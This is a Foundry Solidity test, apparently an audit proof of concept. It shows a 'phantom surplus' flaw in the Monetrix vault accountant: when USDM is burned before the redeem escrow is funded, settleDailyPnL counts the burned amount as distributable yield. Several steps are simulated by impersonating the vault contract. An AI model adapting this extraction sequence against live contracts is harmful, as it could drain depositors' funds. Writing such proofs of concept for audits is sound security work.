// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/governance/MonetrixAccessController.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts, wire dependencies
// 2. [T=0] User1 deposits 100,000 USDC, receives 100,000 USDM
// 3. [T=1] User1 requests redeem for 50,000 USDM. Vault transfers USDM to itself, calls RedeemEscrow.addObligation(). USDM supply unchanged, RedeemEscrow totalOwed increases, but USDC hasn't moved.
// 4. [T=2] Vault burns the 50,000 USDM (reducing supply) BEFORE transferring USDC to RedeemEscrow.
// 5. [T=3] Operator calls settleDailyPnL(). Accountant reads backing (unchanged) and supply (decreased by 50k). Phantom surplus of 50k is created.
// 6. [Assert] Verify distributableSurplus() increased by the burned amount, proving phantom yield extraction.

contract MockUSDC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    uint8 public decimals = 6;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract AuditAgentPoC is Test {
    MonetrixAccountant accountant;
    MonetrixVault vault;
    RedeemEscrow redeemEscrow;
    USDM usdm;
    MockUSDC usdc;
    MonetrixAccessController acl;

    address governor = address(0x1);
    address operator = address(0x2);
    address user1 = address(0x3);

    function setUp() public {
        console.log("setUp: start");

        acl = new MonetrixAccessController();
        console.log("setUp: acl deployed at", address(acl));
        acl.initialize(governor);
        console.log("setUp: acl initialized");

        usdc = new MockUSDC();
        console.log("setUp: usdc deployed at", address(usdc));
        usdm = new USDM();
        console.log("setUp: usdm deployed at", address(usdm));
        usdm.initialize(address(acl));
        console.log("setUp: usdm initialized");

        vault = new MonetrixVault();
        console.log("setUp: vault deployed at", address(vault));
        accountant = new MonetrixAccountant();
        console.log("setUp: accountant deployed at", address(accountant));
        redeemEscrow = new RedeemEscrow();
        console.log("setUp: redeemEscrow deployed at", address(redeemEscrow));

        // Initialize with dummy addresses for config/susdm/coreDepositWallet since we only test Accountant logic
        console.log("setUp: calling vault.initialize");
        vault.initialize(address(usdc), address(usdm), address(0), address(0), address(0), address(acl));
        console.log("setUp: vault initialized");

        console.log("setUp: calling accountant.initialize");
        accountant.initialize(address(vault), address(usdc), address(usdm), address(acl));
        console.log("setUp: accountant initialized");

        console.log("setUp: calling redeemEscrow.initialize");
        redeemEscrow.initialize(address(usdc), address(vault), address(acl));
        console.log("setUp: redeemEscrow initialized");

        // Wire dependencies
        console.log("setUp: wiring dependencies");
        vm.startPrank(governor);
        usdm.setVault(address(vault));
        console.log("setUp: usdm.setVault done");
        vault.setAccountant(address(accountant));
        console.log("setUp: vault.setAccountant done");
        vault.setRedeemEscrow(address(redeemEscrow));
        console.log("setUp: vault.setRedeemEscrow done");
        vm.stopPrank();

        // Fund user1
        console.log("setUp: funding user1");
        usdc.mint(user1, 100_000e6);
        console.log("setUp: user1 funded, balance:", usdc.balanceOf(user1));
        console.log("setUp: end");
    }

    function test_phantomSurplus_exploit() public {
        console.log("test: starting exploit");

        // 1. User1 deposits 100,000 USDC
        vm.startPrank(user1);
        usdc.approve(address(vault), 100_000e6);
        console.log("test: user1 approved vault");
        vault.deposit(100_000e6);
        console.log("test: user1 deposited 100k USDC");
        vm.stopPrank();

        uint256 supplyBefore = usdm.totalSupply();
        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));
        int256 surplusBefore = accountant.distributableSurplus();

        console.log("Step 1: supplyBefore =", supplyBefore);
        console.log("Step 1: vaultUsdcBefore =", vaultUsdcBefore);
        console.log("Step 1: surplusBefore =", uint256(surplusBefore));

        // 2. User1 requests redeem for 50,000 USDM
        vm.startPrank(user1);
        usdm.approve(address(vault), 50_000e6);
        console.log("test: user1 approved vault for USDM");
        vault.requestRedeem(50_000e6);
        console.log("test: user1 requested redeem for 50k USDM");
        vm.stopPrank();

        uint256 supplyAfterRequest = usdm.totalSupply();
        uint256 vaultUsdcAfterRequest = usdc.balanceOf(address(vault));
        uint256 redeemEscrowOwed = redeemEscrow.totalOwed();

        console.log("Step 2: supplyAfterRequest =", supplyAfterRequest);
        console.log("Step 2: vaultUsdcAfterRequest =", vaultUsdcAfterRequest);
        console.log("Step 2: redeemEscrowOwed =", redeemEscrowOwed);

        // 3. CRITICAL EDGE CASE: Vault burns USDM BEFORE funding RedeemEscrow with USDC
        // We simulate the vault burning the USDM it holds from the redeem request
        console.log("test: vault burning 50k USDM");
        vm.prank(address(vault));
        usdm.burn(50_000e6);
        console.log("test: vault burned 50k USDM");

        uint256 supplyAfterBurn = usdm.totalSupply();
        uint256 vaultUsdcAfterBurn = usdc.balanceOf(address(vault));

        console.log("Step 3: supplyAfterBurn =", supplyAfterBurn);
        console.log("Step 3: vaultUsdcAfterBurn =", vaultUsdcAfterBurn);

        // 4. Operator calls settleDailyPnL() between burn and funding
        // The Accountant reads backing (vault USDC hasn't decreased) and supply (decreased by 50k)
        // This creates a phantom surplus of 50,000 USDC
        console.log("test: calling settleDailyPnL");
        vm.prank(address(vault)); // settleDailyPnL is onlyVault
        uint256 distributable = accountant.settleDailyPnL(0);
        console.log("test: settleDailyPnL completed");

        int256 surplusAfter = accountant.distributableSurplus();

        console.log("Step 4: distributable =", distributable);
        console.log("Step 4: surplusAfter =", uint256(surplusAfter));

        // 5. Assert that the phantom surplus was created
        // The surplus should have increased by exactly the burned amount (50,000e6)
        // because backing stayed the same but supply dropped.
        console.log("test: asserting phantom surplus");
        assertGt(surplusAfter, surplusBefore, "Phantom surplus should be created");
        assertEq(uint256(surplusAfter - surplusBefore), 50_000e6, "Surplus increase should match burned USDM amount");
        console.log("test: assertions passed");
    }
}
